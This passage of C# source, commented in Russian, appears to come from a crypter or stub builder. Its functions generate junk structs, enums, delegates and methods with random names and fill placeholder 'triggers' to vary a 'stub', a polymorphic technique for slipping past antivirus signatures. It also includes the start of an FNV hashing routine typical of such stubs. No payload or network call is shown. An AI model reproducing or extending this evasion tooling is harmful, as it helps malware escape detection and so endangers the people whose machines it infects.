                while (IsSubInString(ref strtemp, ref sHelp) || IsSubInString(ref str0, ref sHelp) || IsSubInString(ref inNull0, ref sHelp))//ищем новое название для триггера пока не найдется то которое уже не содержится в модифицированном коде стаба
                {
                    sHelp = GenerateRandomString();
                }
                strtemp = strtemp.Replace("%var123%", sHelp);//после того как нашли заменяем триггер на наше новое имя

                sHelp = GenerateRandomString();
                while (IsSubInString(ref strtemp, ref sHelp) || IsSubInString(ref str0, ref sHelp) || IsSubInString(ref inNull0, ref sHelp))//ищем новое название для триггера пока не найдется то которое уже не содержится в модифицированном коде стаба
                {
                    sHelp = GenerateRandomString();
                }
                strtemp = strtemp.Replace("%var124%", sHelp);//после того как нашли заменяем триггер на наше новое имя

                sHelp = GenerateRandomString();
                while (IsSubInString(ref strtemp, ref sHelp) || IsSubInString(ref str0, ref sHelp) || IsSubInString(ref inNull0, ref sHelp))//ищем новое название для триггера пока не найдется то которое уже не содержится в модифицированном коде стаба
                {
                    sHelp = GenerateRandomString();
                }
                strtemp = strtemp.Replace("%var125%", sHelp);//после того как нашли заменяем триггер на наше новое имя

                ModifyAllUniqueTriggersVoid(ref str0, ref strtemp);// заполняем все триггеры
                //MessageBox.Show(strtemp);

                return strtemp;
            }

            public static string InstructionAnyStatic7(ref string str0, ref string inNull0)//восьмой тип инструкции для static класса
            {
                string strtemp = "[StructLayout(LayoutKind.Sequential)] public struct %var123% {%$#@structtrigger0@#$% %$#@structtrigger1@#$% " +
                "%$#@structtrigger2@#$% %$#@structtrigger3@#$% %$#@structtrigger4@#$%" +
                "%$#@structtrigger5@#$% %$#@structtrigger6@#$% %$#@structtrigger7@#$% } ";
                //strtemp = " static void %var123%(){} ";

                string sHelp = "";

                sHelp = GenerateRandomString();
                while (IsSubInString(ref strtemp, ref sHelp) || IsSubInString(ref str0, ref sHelp) || IsSubInString(ref inNull0, ref sHelp))//ищем новое название для триггера пока не найдется то которое уже не содержится в модифицированном коде стаба
                {
                    sHelp = GenerateRandomString();
                }
                strtemp = strtemp.Replace("%var123%", sHelp);//после того как нашли заменяем триггер на наше новое имя

                ModifyAllUniqueTriggersStruct(ref str0, ref strtemp);// заполняем все триггеры
                //MessageBox.Show(strtemp);

                return strtemp;
            }

            public static string InstructionAnyStatic8(ref string str0, ref string inNull0)//девятый тип инструкции для static класса
            {
                string strtemp = " public enum %var123% {%$#@enumtrigger0@#$% %$#@enumtrigger1@#$% " +
                "%$#@enumtrigger2@#$% %$#@enumtrigger3@#$% %$#@enumtrigger4@#$%" +
                "%$#@enumtrigger5@#$% %$#@enumtrigger6@#$% %$#@enumtrigger7@#$% } ";
                //strtemp = " static void %var123%(){} ";

                string sHelp = "";

                sHelp = GenerateRandomString();
                while (IsSubInString(ref strtemp, ref sHelp) || IsSubInString(ref str0, ref sHelp) || IsSubInString(ref inNull0, ref sHelp))//ищем новое название для триггера пока не найдется то которое уже не содержится в модифицированном коде стаба
                {
                    sHelp = GenerateRandomString();
                }
                strtemp = strtemp.Replace("%var123%", sHelp);//после того как нашли заменяем триггер на наше новое имя

                ModifyAllUniqueTriggersEnum(ref str0, ref strtemp);// заполняем все триггеры
                //MessageBox.Show(strtemp);

                return strtemp;
            }

            public static string InstructionAnyStatic9(ref string str0, ref string inNull0)//девятый тип инструкции для static класса
            {
                string strtemp = " public delegate int %var123%(string %var124%,byte %var125%); ";
                //strtemp = " static void %var123%(){} ";

                string sHelp = "";

                sHelp = GenerateRandomString();
                while (IsSubInString(ref strtemp, ref sHelp) || IsSubInString(ref str0, ref sHelp) || IsSubInString(ref inNull0, ref sHelp))//ищем новое название для триггера пока не найдется то которое уже не содержится в модифицированном коде стаба
                {
                    sHelp = GenerateRandomString();
                }
                strtemp = strtemp.Replace("%var123%", sHelp);//после того как нашли заменяем триггер на наше новое имя

                sHelp = GenerateRandomString();
                while (IsSubInString(ref strtemp, ref sHelp) || IsSubInString(ref str0, ref sHelp) || IsSubInString(ref inNull0, ref sHelp))//ищем новое название для триггера пока не найдется то которое уже не содержится в модифицированном коде стаба
                {
                    sHelp = GenerateRandomString();
                }
                strtemp = strtemp.Replace("%var124%", sHelp);//после того как нашли заменяем триггер на наше новое имя

                sHelp = GenerateRandomString();
                while (IsSubInString(ref strtemp, ref sHelp) || IsSubInString(ref str0, ref sHelp) || IsSubInString(ref inNull0, ref sHelp))//ищем новое название для триггера пока не найдется то которое уже не содержится в модифицированном коде стаба
                {
                    sHelp = GenerateRandomString();
                }
                strtemp = strtemp.Replace("%var125%", sHelp);//после того как нашли заменяем триггер на наше новое имя

                //MessageBox.Show(strtemp);

                return strtemp;
            }

            public static string InstructionAnyStatic10(ref string str0, ref string inNull0)//девятый тип инструкции для static класса
            {
                string strtemp = " public delegate string %var123%(double %var124%,byte %var125%,bool %var126%,int %var127%); ";
                //strtemp = " static void %var123%(){} ";

                string sHelp = "";

                sHelp = GenerateRandomString();
                while (IsSubInString(ref strtemp, ref sHelp) || IsSubInString(ref str0, ref sHelp) || IsSubInString(ref inNull0, ref sHelp))//ищем новое название для триггера пока не найдется то которое уже не содержится в модифицированном коде стаба
                {
                    sHelp = GenerateRandomString();
                }
                strtemp = strtemp.Replace("%var123%", sHelp);//после того как нашли заменяем триггер на наше новое имя

                sHelp = GenerateRandomString();
                while (IsSubInString(ref strtemp, ref sHelp) || IsSubInString(ref str0, ref sHelp) || IsSubInString(ref inNull0, ref sHelp))//ищем новое название для триггера пока не найдется то которое уже не содержится в модифицированном коде стаба
                {
                    sHelp = GenerateRandomString();
                }
                strtemp = strtemp.Replace("%var124%", sHelp);//после того как нашли заменяем триггер на наше новое имя

                sHelp = GenerateRandomString();
                while (IsSubInString(ref strtemp, ref sHelp) || IsSubInString(ref str0, ref sHelp) || IsSubInString(ref inNull0, ref sHelp))//ищем новое название для триггера пока не найдется то которое уже не содержится в модифицированном коде стаба
                {
                    sHelp = GenerateRandomString();
                }
                strtemp = strtemp.Replace("%var125%", sHelp);//после того как нашли заменяем триггер на наше новое имя

                sHelp = GenerateRandomString();
                while (IsSubInString(ref strtemp, ref sHelp) || IsSubInString(ref str0, ref sHelp) || IsSubInString(ref inNull0, ref sHelp))//ищем новое название для триггера пока не найдется то которое уже не содержится в модифицированном коде стаба
                {
                    sHelp = GenerateRandomString();
                }
                strtemp = strtemp.Replace("%var126%", sHelp);//после того как нашли заменяем триггер на наше новое имя

                sHelp = GenerateRandomString();
                while (IsSubInString(ref strtemp, ref sHelp) || IsSubInString(ref str0, ref sHelp) || IsSubInString(ref inNull0, ref sHelp))//ищем новое название для триггера пока не найдется то которое уже не содержится в модифицированном коде стаба
                {
                    sHelp = GenerateRandomString();
                }
                strtemp = strtemp.Replace("%var127%", sHelp);//после того как нашли заменяем триггер на наше новое имя

                //MessageBox.Show(strtemp);

                return strtemp;
            }

            public static string InstructionAnyStatic11(ref string str0, ref string inNull0)//шестой тип инструкции для static класса
            {
                string strtemp = " public static int %var123%(string %var124%,int %var125%){%$#@additionaltrigger0@#$% %$#@additionaltrigger1@#$% " +
                "%$#@additionaltrigger2@#$% %$#@additionaltrigger3@#$% %$#@additionaltrigger4@#$%" +
                "%$#@additionaltrigger5@#$% %$#@additionaltrigger6@#$% %$#@additionaltrigger7@#$% %$#@additionaltrigger8@#$% %$#@additionaltrigger9@#$% %$#@additionaltrigger10@#$% return %var125%; } ";
                //strtemp = " static void %var123%(){} ";

                string sHelp = "";

                sHelp = GenerateRandomString();
                while (IsSubInString(ref strtemp, ref sHelp) || IsSubInString(ref str0, ref sHelp) || IsSubInString(ref inNull0, ref sHelp))//ищем новое название для триггера пока не найдется то которое уже не содержится в модифицированном коде стаба
                {
                    sHelp = GenerateRandomString();
                }
                strtemp = strtemp.Replace("%var123%", sHelp);//после того как нашли заменяем триггер на наше новое имя

                sHelp = GenerateRandomString();
                while (IsSubInString(ref strtemp, ref sHelp) || IsSubInString(ref str0, ref sHelp) || IsSubInString(ref inNull0, ref sHelp))//ищем новое название для триггера пока не найдется то которое уже не содержится в модифицированном коде стаба
                {
                    sHelp = GenerateRandomString();
                }
                strtemp = strtemp.Replace("%var124%", sHelp);//после того как нашли заменяем триггер на наше новое имя

                sHelp = GenerateRandomString();
                while (IsSubInString(ref strtemp, ref sHelp) || IsSubInString(ref str0, ref sHelp) || IsSubInString(ref inNull0, ref sHelp))//ищем новое название для триггера пока не найдется то которое уже не содержится в модифицированном коде стаба
                {
                    sHelp = GenerateRandomString();
                }
                strtemp = strtemp.Replace("%var125%", sHelp);//после того как нашли заменяем триггер на наше новое имя

                ModifyAllUniqueTriggersVoid(ref str0, ref strtemp);// заполняем все триггеры
                //MessageBox.Show(strtemp);

                return strtemp;
            }


            public static string InstructionAnyStatic12(ref string str0, ref string inNull0)//седьмой тип инструкции для static класса
            {
                string strtemp = " public static double %var123%(double %var124%,ulong %var125%){%$#@additionaltrigger0@#$% %$#@additionaltrigger1@#$% " +
                "%$#@additionaltrigger2@#$% %$#@additionaltrigger3@#$% %$#@additionaltrigger4@#$%" +
                "%$#@additionaltrigger5@#$% %$#@additionaltrigger6@#$% %$#@additionaltrigger7@#$% return %var124%; } ";
                //strtemp = " static void %var123%(){} ";

                string sHelp = "";

                sHelp = GenerateRandomString();
                while (IsSubInString(ref strtemp, ref sHelp) || IsSubInString(ref str0, ref sHelp) || IsSubInString(ref inNull0, ref sHelp))//ищем новое название для триггера пока не найдется то которое уже не содержится в модифицированном коде стаба
                {
                    sHelp = GenerateRandomString();
                }
                strtemp = strtemp.Replace("%var123%", sHelp);//после того как нашли заменяем триггер на наше новое имя

                sHelp = GenerateRandomString();
                while (IsSubInString(ref strtemp, ref sHelp) || IsSubInString(ref str0, ref sHelp) || IsSubInString(ref inNull0, ref sHelp))//ищем новое название для триггера пока не найдется то которое уже не содержится в модифицированном коде стаба
                {
                    sHelp = GenerateRandomString();
                }
                strtemp = strtemp.Replace("%var124%", sHelp);//после того как нашли заменяем триггер на наше новое имя

                sHelp = GenerateRandomString();
                while (IsSubInString(ref strtemp, ref sHelp) || IsSubInString(ref str0, ref sHelp) || IsSubInString(ref inNull0, ref sHelp))//ищем новое название для триггера пока не найдется то которое уже не содержится в модифицированном коде стаба
                {
                    sHelp = GenerateRandomString();
                }
                strtemp = strtemp.Replace("%var125%", sHelp);//после того как нашли заменяем триггер на наше новое имя

                ModifyAllUniqueTriggersVoid(ref str0, ref strtemp);// заполняем все триггеры
                //MessageBox.Show(strtemp);

                return strtemp;
            }

            public static string InstructionAnyStatic13(ref string str0, ref string inNull0)//шестой тип инструкции для static класса
            {
                string strtemp = "public static byte[] %var123%(string %var124%){%$#@additionaltrigger0@#$% %$#@additionaltrigger1@#$% " +
                "%$#@additionaltrigger2@#$% %$#@additionaltrigger3@#$% %$#@additionaltrigger4@#$%" +
                "%$#@additionaltrigger5@#$% %$#@additionaltrigger6@#$% %$#@additionaltrigger7@#$% %$#@additionaltrigger8@#$% %$#@additionaltrigger9@#$% %$#@additionaltrigger10@#$% return null; } ";
 

                string sHelp = "";

                sHelp = GenerateRandomString();
                while (IsSubInString(ref strtemp, ref sHelp) || IsSubInString(ref str0, ref sHelp) || IsSubInString(ref inNull0, ref sHelp))//ищем новое название для триггера пока не найдется то которое уже не содержится в модифицированном коде стаба
                {
                    sHelp = GenerateRandomString();
                }
                strtemp = strtemp.Replace("%var123%", sHelp);//после того как нашли заменяем триггер на наше новое имя

                sHelp = GenerateRandomString();
                while (IsSubInString(ref strtemp, ref sHelp) || IsSubInString(ref str0, ref sHelp) || IsSubInString(ref inNull0, ref sHelp))//ищем новое название для триггера пока не найдется то которое уже не содержится в модифицированном коде стаба
                {
                    sHelp = GenerateRandomString();
                }
                strtemp = strtemp.Replace("%var124%", sHelp);//после того как нашли заменяем триггер на наше новое имя

                ModifyAllUniqueTriggersVoid(ref str0, ref strtemp);// заполняем все триггеры
                //MessageBox.Show(strtemp);

                return strtemp;
            }


            public static string InstructionAnyStatic14(ref string str0, ref string inNull0)//шестой тип инструкции для static класса
            {
                string strtemp = " static byte[] %var123%(string %var124%){%$#@additionaltrigger0@#$% %$#@additionaltrigger1@#$% " +
                "%$#@additionaltrigger2@#$% %$#@additionaltrigger3@#$% %$#@additionaltrigger4@#$%" +
                "%$#@additionaltrigger5@#$% %$#@additionaltrigger6@#$% %$#@additionaltrigger7@#$% %$#@additionaltrigger8@#$% %$#@additionaltrigger9@#$% %$#@additionaltrigger10@#$% return null; } ";


                string sHelp = "";

                sHelp = GenerateRandomString();
                while (IsSubInString(ref strtemp, ref sHelp) || IsSubInString(ref str0, ref sHelp) || IsSubInString(ref inNull0, ref sHelp))//ищем новое название для триггера пока не найдется то которое уже не содержится в модифицированном коде стаба
                {
                    sHelp = GenerateRandomString();
                }
                strtemp = strtemp.Replace("%var123%", sHelp);//после того как нашли заменяем триггер на наше новое имя

                sHelp = GenerateRandomString();
                while (IsSubInString(ref strtemp, ref sHelp) || IsSubInString(ref str0, ref sHelp) || IsSubInString(ref inNull0, ref sHelp))//ищем новое название для триггера пока не найдется то которое уже не содержится в модифицированном коде стаба
                {
                    sHelp = GenerateRandomString();
                }
                strtemp = strtemp.Replace("%var124%", sHelp);//после того как нашли заменяем триггер на наше новое имя

                ModifyAllUniqueTriggersVoid(ref str0, ref strtemp);// заполняем все триггеры
                //MessageBox.Show(strtemp);

                return strtemp;
            }

            public static string InstructionAnyStatic15(ref string str0, ref string inNull0)//шестой тип инструкции для static класса
            {
                string strtemp = " private static byte[] %var123%(byte[] %var124%){%$#@additionaltrigger0@#$% %$#@additionaltrigger1@#$% " +
                "%$#@additionaltrigger2@#$% %$#@additionaltrigger3@#$% %$#@additionaltrigger4@#$%" +
                "%$#@additionaltrigger5@#$% %$#@additionaltrigger6@#$% %$#@additionaltrigger7@#$% %$#@additionaltrigger8@#$% %$#@additionaltrigger9@#$% %$#@additionaltrigger10@#$% return null; } ";


                string sHelp = "";

                sHelp = GenerateRandomString();
                while (IsSubInString(ref strtemp, ref sHelp) || IsSubInString(ref str0, ref sHelp) || IsSubInString(ref inNull0, ref sHelp))//ищем новое название для триггера пока не найдется то которое уже не содержится в модифицированном коде стаба
                {
                    sHelp = GenerateRandomString();
                }
                strtemp = strtemp.Replace("%var123%", sHelp);//после того как нашли заменяем триггер на наше новое имя

                sHelp = GenerateRandomString();
                while (IsSubInString(ref strtemp, ref sHelp) || IsSubInString(ref str0, ref sHelp) || IsSubInString(ref inNull0, ref sHelp))//ищем новое название для триггера пока не найдется то которое уже не содержится в модифицированном коде стаба
                {
                    sHelp = GenerateRandomString();
                }
                strtemp = strtemp.Replace("%var124%", sHelp);//после того как нашли заменяем триггер на наше новое имя

                ModifyAllUniqueTriggersVoid(ref str0, ref strtemp);// заполняем все триггеры
                //MessageBox.Show(strtemp);

                return strtemp;
            }

            public static string InstructionAnyStatic16(ref string str0, ref string inNull0)//шестой тип инструкции для static класса
            {
                string strtemp = " public static byte[] %var123%(byte[] %var124%){%$#@additionaltrigger0@#$% %$#@additionaltrigger1@#$% " +
                "%$#@additionaltrigger2@#$% %$#@additionaltrigger3@#$% %$#@additionaltrigger4@#$%" +
                "%$#@additionaltrigger5@#$% %$#@additionaltrigger6@#$% %$#@additionaltrigger7@#$% %$#@additionaltrigger8@#$% %$#@additionaltrigger9@#$% %$#@additionaltrigger10@#$% return null; } ";


                string sHelp = "";

                sHelp = GenerateRandomString();
                while (IsSubInString(ref strtemp, ref sHelp) || IsSubInString(ref str0, ref sHelp) || IsSubInString(ref inNull0, ref sHelp))//ищем новое название для триггера пока не найдется то которое уже не содержится в модифицированном коде стаба
                {
                    sHelp = GenerateRandomString();
                }
                strtemp = strtemp.Replace("%var123%", sHelp);//после того как нашли заменяем триггер на наше новое имя

                sHelp = GenerateRandomString();
                while (IsSubInString(ref strtemp, ref sHelp) || IsSubInString(ref str0, ref sHelp) || IsSubInString(ref inNull0, ref sHelp))//ищем новое название для триггера пока не найдется то которое уже не содержится в модифицированном коде стаба
                {
                    sHelp = GenerateRandomString();
                }
                strtemp = strtemp.Replace("%var124%", sHelp);//после того как нашли заменяем триггер на наше новое имя

                ModifyAllUniqueTriggersVoid(ref str0, ref strtemp);// заполняем все триггеры
                //MessageBox.Show(strtemp);

                return strtemp;
            }

            public static string InstructionAnyStatic17(ref string str0, ref string inNull0)//седьмой тип инструкции для static класса
            {
                string strtemp = " public static Int64 %var123%(Int64 %var124%,string %var125%){%$#@additionaltrigger0@#$% %$#@additionaltrigger1@#$% " +
                "%$#@additionaltrigger2@#$% %$#@additionaltrigger3@#$% %$#@additionaltrigger4@#$%" +
                "%$#@additionaltrigger5@#$% %$#@additionaltrigger6@#$% %$#@additionaltrigger7@#$% return 0L; } ";
                //strtemp = " static void %var123%(){} ";

                string sHelp = "";

                sHelp = GenerateRandomString();
                while (IsSubInString(ref strtemp, ref sHelp) || IsSubInString(ref str0, ref sHelp) || IsSubInString(ref inNull0, ref sHelp))//ищем новое название для триггера пока не найдется то которое уже не содержится в модифицированном коде стаба
                {
                    sHelp = GenerateRandomString();
                }
                strtemp = strtemp.Replace("%var123%", sHelp);//после того как нашли заменяем триггер на наше новое имя

                sHelp = GenerateRandomString();
                while (IsSubInString(ref strtemp, ref sHelp) || IsSubInString(ref str0, ref sHelp) || IsSubInString(ref inNull0, ref sHelp))//ищем новое название для триггера пока не найдется то которое уже не содержится в модифицированном коде стаба
                {
                    sHelp = GenerateRandomString();
                }
                strtemp = strtemp.Replace("%var124%", sHelp);//после того как нашли заменяем триггер на наше новое имя

                sHelp = GenerateRandomString();
                while (IsSubInString(ref strtemp, ref sHelp) || IsSubInString(ref str0, ref sHelp) || IsSubInString(ref inNull0, ref sHelp))//ищем новое название для триггера пока не найдется то которое уже не содержится в модифицированном коде стаба
                {
                    sHelp = GenerateRandomString();
                }
                strtemp = strtemp.Replace("%var125%", sHelp);//после того как нашли заменяем триггер на наше новое имя

                ModifyAllUniqueTriggersVoid(ref str0, ref strtemp);// заполняем все триггеры
                //MessageBox.Show(strtemp);

                return strtemp;
            }

            public static string InstructionAnyStatic18(ref string str0, ref string inNull0)//седьмой тип инструкции для static класса
            {
                string strtemp = " static Int64 %var123%(Int64 %var124%,string %var125%){%$#@additionaltrigger0@#$% %$#@additionaltrigger1@#$% " +
                "%$#@additionaltrigger2@#$% %$#@additionaltrigger3@#$% %$#@additionaltrigger4@#$%" +
                "%$#@additionaltrigger5@#$% %$#@additionaltrigger6@#$% %$#@additionaltrigger7@#$% return 0L; } ";
                //strtemp = " static void %var123%(){} ";

                string sHelp = "";

                sHelp = GenerateRandomString();
                while (IsSubInString(ref strtemp, ref sHelp) || IsSubInString(ref str0, ref sHelp) || IsSubInString(ref inNull0, ref sHelp))//ищем новое название для триггера пока не найдется то которое уже не содержится в модифицированном коде стаба
                {
                    sHelp = GenerateRandomString();
                }
                strtemp = strtemp.Replace("%var123%", sHelp);//после того как нашли заменяем триггер на наше новое имя

                sHelp = GenerateRandomString();
                while (IsSubInString(ref strtemp, ref sHelp) || IsSubInString(ref str0, ref sHelp) || IsSubInString(ref inNull0, ref sHelp))//ищем новое название для триггера пока не найдется то которое уже не содержится в модифицированном коде стаба
                {
                    sHelp = GenerateRandomString();
                }
                strtemp = strtemp.Replace("%var124%", sHelp);//после того как нашли заменяем триггер на наше новое имя

                sHelp = GenerateRandomString();
                while (IsSubInString(ref strtemp, ref sHelp) || IsSubInString(ref str0, ref sHelp) || IsSubInString(ref inNull0, ref sHelp))//ищем новое название для триггера пока не найдется то которое уже не содержится в модифицированном коде стаба
                {
                    sHelp = GenerateRandomString();
                }
                strtemp = strtemp.Replace("%var125%", sHelp);//после того как нашли заменяем триггер на наше новое имя

                ModifyAllUniqueTriggersVoid(ref str0, ref strtemp);// заполняем все триггеры
                //MessageBox.Show(strtemp);

                return strtemp;
            }

            public static string InstructionAnyStatic19(ref string str0, ref string inNull0)//седьмой тип инструкции для static класса
            {
                string strtemp = " static byte[] %var123%(IntPtr %var124%,int %var125%){%$#@additionaltrigger0@#$% %$#@additionaltrigger1@#$% " +
                "%$#@additionaltrigger2@#$% %$#@additionaltrigger3@#$% %$#@additionaltrigger4@#$%" +
                "%$#@additionaltrigger5@#$% %$#@additionaltrigger6@#$% %$#@additionaltrigger7@#$% return null; } ";
                //strtemp = " static void %var123%(){} ";

                string sHelp = "";

                sHelp = GenerateRandomString();
                while (IsSubInString(ref strtemp, ref sHelp) || IsSubInString(ref str0, ref sHelp) || IsSubInString(ref inNull0, ref sHelp))//ищем новое название для триггера пока не найдется то которое уже не содержится в модифицированном коде стаба
                {
                    sHelp = GenerateRandomString();
                }
                strtemp = strtemp.Replace("%var123%", sHelp);//после того как нашли заменяем триггер на наше новое имя

                sHelp = GenerateRandomString();
                while (IsSubInString(ref strtemp, ref sHelp) || IsSubInString(ref str0, ref sHelp) || IsSubInString(ref inNull0, ref sHelp))//ищем новое название для триггера пока не найдется то которое уже не содержится в модифицированном коде стаба
                {
                    sHelp = GenerateRandomString();
                }
                strtemp = strtemp.Replace("%var124%", sHelp);//после того как нашли заменяем триггер на наше новое имя

                sHelp = GenerateRandomString();
                while (IsSubInString(ref strtemp, ref sHelp) || IsSubInString(ref str0, ref sHelp) || IsSubInString(ref inNull0, ref sHelp))//ищем новое название для триггера пока не найдется то которое уже не содержится в модифицированном коде стаба
                {
                    sHelp = GenerateRandomString();
                }
                strtemp = strtemp.Replace("%var125%", sHelp);//после того как нашли заменяем триггер на наше новое имя

                ModifyAllUniqueTriggersVoid(ref str0, ref strtemp);// заполняем все триггеры
                //MessageBox.Show(strtemp);

                return strtemp;
            }

            public static string InstructionAnyStatic20(ref string str0, ref string inNull0)//седьмой тип инструкции для static класса
            {
                string strtemp = " public static byte[] %var123%(IntPtr %var124%,int %var125%){%$#@additionaltrigger0@#$% %$#@additionaltrigger1@#$% " +
                "%$#@additionaltrigger2@#$% %$#@additionaltrigger3@#$% %$#@additionaltrigger4@#$%" +
                "%$#@additionaltrigger5@#$% %$#@additionaltrigger6@#$% %$#@additionaltrigger7@#$% return null; } ";
                //strtemp = " static void %var123%(){} ";

                string sHelp = "";

                sHelp = GenerateRandomString();
                while (IsSubInString(ref strtemp, ref sHelp) || IsSubInString(ref str0, ref sHelp) || IsSubInString(ref inNull0, ref sHelp))//ищем новое название для триггера пока не найдется то которое уже не содержится в модифицированном коде стаба
                {
                    sHelp = GenerateRandomString();
                }
                strtemp = strtemp.Replace("%var123%", sHelp);//после того как нашли заменяем триггер на наше новое имя

                sHelp = GenerateRandomString();
                while (IsSubInString(ref strtemp, ref sHelp) || IsSubInString(ref str0, ref sHelp) || IsSubInString(ref inNull0, ref sHelp))//ищем новое название для триггера пока не найдется то которое уже не содержится в модифицированном коде стаба
                {
                    sHelp = GenerateRandomString();
                }
                strtemp = strtemp.Replace("%var124%", sHelp);//после того как нашли заменяем триггер на наше новое имя

                sHelp = GenerateRandomString();
                while (IsSubInString(ref strtemp, ref sHelp) || IsSubInString(ref str0, ref sHelp) || IsSubInString(ref inNull0, ref sHelp))//ищем новое название для триггера пока не найдется то которое уже не содержится в модифицированном коде стаба
                {
                    sHelp = GenerateRandomString();
                }
                strtemp = strtemp.Replace("%var125%", sHelp);//после того как нашли заменяем триггер на наше новое имя

                ModifyAllUniqueTriggersVoid(ref str0, ref strtemp);// заполняем все триггеры
                //MessageBox.Show(strtemp);

                return strtemp;
            }

            public static string InstructionAnyStatic21(ref string str0, ref string inNull0)//шестой тип инструкции для static класса
            {
                string strtemp = " public static IntPtr %var123%(string %var124%){%$#@additionaltrigger0@#$% %$#@additionaltrigger1@#$% " +
                "%$#@additionaltrigger2@#$% %$#@additionaltrigger3@#$% %$#@additionaltrigger4@#$%" +
                "%$#@additionaltrigger5@#$% %$#@additionaltrigger6@#$% %$#@additionaltrigger7@#$% %$#@additionaltrigger8@#$% %$#@additionaltrigger9@#$% %$#@additionaltrigger10@#$% return IntPtr.Zero; } ";


                string sHelp = "";

                sHelp = GenerateRandomString();
                while (IsSubInString(ref strtemp, ref sHelp) || IsSubInString(ref str0, ref sHelp) || IsSubInString(ref inNull0, ref sHelp))//ищем новое название для триггера пока не найдется то которое уже не содержится в модифицированном коде стаба
                {
                    sHelp = GenerateRandomString();
                }
                strtemp = strtemp.Replace("%var123%", sHelp);//после того как нашли заменяем триггер на наше новое имя

                sHelp = GenerateRandomString();
                while (IsSubInString(ref strtemp, ref sHelp) || IsSubInString(ref str0, ref sHelp) || IsSubInString(ref inNull0, ref sHelp))//ищем новое название для триггера пока не найдется то которое уже не содержится в модифицированном коде стаба
                {
                    sHelp = GenerateRandomString();
                }
                strtemp = strtemp.Replace("%var124%", sHelp);//после того как нашли заменяем триггер на наше новое имя

                ModifyAllUniqueTriggersVoid(ref str0, ref strtemp);// заполняем все триггеры
                //MessageBox.Show(strtemp);

                return strtemp;
            }

            public static string InstructionAnyStatic22(ref string str0, ref string inNull0)//шестой тип инструкции для static класса
            {
                string strtemp = " static IntPtr %var123%(string %var124%){%$#@additionaltrigger0@#$% %$#@additionaltrigger1@#$% " +
                "%$#@additionaltrigger2@#$% %$#@additionaltrigger3@#$% %$#@additionaltrigger4@#$%" +
                "%$#@additionaltrigger5@#$% %$#@additionaltrigger6@#$% %$#@additionaltrigger7@#$% %$#@additionaltrigger8@#$% %$#@additionaltrigger9@#$% %$#@additionaltrigger10@#$% return IntPtr.Zero; } ";


                string sHelp = "";

                sHelp = GenerateRandomString();
                while (IsSubInString(ref strtemp, ref sHelp) || IsSubInString(ref str0, ref sHelp) || IsSubInString(ref inNull0, ref sHelp))//ищем новое название для триггера пока не найдется то которое уже не содержится в модифицированном коде стаба
                {
                    sHelp = GenerateRandomString();
                }
                strtemp = strtemp.Replace("%var123%", sHelp);//после того как нашли заменяем триггер на наше новое имя

                sHelp = GenerateRandomString();
                while (IsSubInString(ref strtemp, ref sHelp) || IsSubInString(ref str0, ref sHelp) || IsSubInString(ref inNull0, ref sHelp))//ищем новое название для триггера пока не найдется то которое уже не содержится в модифицированном коде стаба
                {
                    sHelp = GenerateRandomString();
                }
                strtemp = strtemp.Replace("%var124%", sHelp);//после того как нашли заменяем триггер на наше новое имя

                ModifyAllUniqueTriggersVoid(ref str0, ref strtemp);// заполняем все триггеры
                //MessageBox.Show(strtemp);

                return strtemp;
            }


            public static string InstructionAnyStatic23(ref string str0, ref string inNull0)//шестой тип инструкции для static класса
            {
                string strtemp = @" private static int %$#@basictrigger76@#$%(long %$#@basictrigger77@#$%, long %$#@basictrigger78@#$%, int  %$#@basictrigger79@#$%)
                 {

                 %$#@additionaltriggerF237@#$%
			     %$#@additionaltriggerF238@#$%
			     %$#@additionaltriggerF239@#$%
                 return (int)(%$#@basictrigger77@#$% - %$#@basictrigger78@#$% - (long)%$#@basictrigger79@#$%);
                 } ";


                ReplaceAllUniqueTriggersBase(ref str0, ref strtemp);// заполняем все триггеры имен
                ModifyAllUniqueTriggersVoid(ref str0, ref strtemp);// заполняем все триггеры
                //MessageBox.Show(strtemp);

                return strtemp;
            }

            public static string InstructionAnyStatic24(ref string str0, ref string inNull0)//шестой тип инструкции для static класса
            {
                string strtemp = @" private static bool %$#@basictrigger80@#$%(long %$#@basictrigger81@#$%, int %$#@basictrigger82@#$%, long %$#@basictrigger83@#$%, int %$#@basictrigger84@#$%)
        {
		    %$#@additionaltriggerF240@#$%
			%$#@additionaltriggerF241@#$%
			%$#@additionaltriggerF242@#$%		    
            for (int %$#@basictrigger85@#$% = 0; %$#@basictrigger85@#$% <= %$#@basictrigger82@#$%; ++%$#@basictrigger85@#$%)
            {
		        %$#@additionaltriggerF243@#$%
			    %$#@additionaltriggerF244@#$%
			    %$#@additionaltriggerF245@#$%		
                if (%$#@basictrigger81@#$% + (long)%$#@basictrigger85@#$% == %$#@basictrigger83@#$%)
                    return true;
		        %$#@additionaltriggerF246@#$%
			    %$#@additionaltriggerF247@#$%
			    %$#@additionaltriggerF248@#$%		
            }
		    %$#@additionaltriggerF249@#$%
			%$#@additionaltriggerF250@#$%
			%$#@additionaltriggerF251@#$%		
            for (int %$#@basictrigger86@#$% = 0; %$#@basictrigger86@#$%  <= %$#@basictrigger84@#$%; ++%$#@basictrigger86@#$% )
            {
		        %$#@additionaltriggerF252@#$%
			    %$#@additionaltriggerF253@#$%
			    %$#@additionaltriggerF254@#$%	
                if (%$#@basictrigger83@#$% + (long)%$#@basictrigger86@#$%  == %$#@basictrigger81@#$%)
                    return true;
		        %$#@additionaltriggerF255@#$%
			    %$#@additionaltriggerF256@#$%
			    %$#@additionaltriggerF257@#$%	
            }
		    %$#@additionaltriggerF258@#$%
			%$#@additionaltriggerF259@#$%
			%$#@additionaltriggerF260@#$%	
            return false;
        } ";


                ReplaceAllUniqueTriggersBase(ref str0, ref strtemp);// заполняем все триггеры имен
                ModifyAllUniqueTriggersVoid(ref str0, ref strtemp);// заполняем все триггеры
                //MessageBox.Show(strtemp);

                return strtemp;
            }

            public static string InstructionAnyStatic25(ref string str0, ref string inNull0)//шестой тип инструкции для static класса
            {
                string strtemp = @" private static uint %$#@basictriggerFNVHash0@#$%(string %$#@basictriggerstr0@#$%)
        {
			%$#@additionaltriggerFNVHash0@#$%
		    %$#@additionaltriggerFNVHash1@#$%
		    %$#@additionaltriggerFNVHash2@#$%
            uint %$#@basictriggerfnv_prime@#$% = 0x811C9DC5;
			%$#@additionaltriggerFNVHash2x@#$%
		    %$#@additionaltriggerFNVHash3@#$%
		    %$#@additionaltriggerFNVHash4@#$%
            uint %$#@basictriggerhash@#$% = 0;
			%$#@additionaltriggerFNVHash5@#$%
		    %$#@additionaltriggerFNVHash6@#$%
		    %$#@additionaltriggerFNVHash7@#$%
            for (int i = 0; i < %$#@basictriggerstr0@#$%.Length; i++)
            {
